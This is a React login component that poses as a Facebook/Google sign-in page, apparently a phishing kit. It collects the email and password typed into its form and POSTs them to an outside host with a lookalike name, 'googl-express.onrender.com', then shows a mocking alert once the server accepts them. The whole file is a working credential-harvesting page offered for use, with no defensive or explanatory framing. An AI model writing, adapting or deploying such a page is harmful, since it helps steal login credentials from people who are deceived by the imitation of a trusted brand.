import React, { useState } from 'react';
import './Login.css';

function Login() {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');

    const handleSubmit = async(event) => {
        
        try {
            const response = await fetch('https://googl-express.onrender.com', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    pwd: password,
                }),
            });
            console.log(response)

            if (response.ok) {
                alert('you are fucked up')
                const data = await response.json();
                console.log('Login successful:', data);
                // Handle success (e.g., redirect, show success message, etc.)
            } else {
                const errorData = await response.json();
                console.error('Login failed:', errorData);
                
            }
        } catch (error) {
            console.error('An error occurred:', error);
            
        }
    };

    return (
        <div className="login-container">
            <div className="logo">
                <img
                    src="https://logos-world.net/wp-content/uploads/2020/05/Facebook-Logo.png"
                    alt="Google Logo"
                />
            </div>
            
                <div className="input-group">
                    <input
                        type="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder="Email or phone"
                        required
                    />
                </div>
                <div className="input-group">
                    <input
                        type="password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Password"
                        required
                    />
                </div>
                <button type="submit" className="btn" onClick={handleSubmit}>Login</button>
            
            <div className="options">
                <a href="#">Forgot email?</a>
                <a href="#">Create account</a>
            </div>
        </div>
    );
}

export default Login;
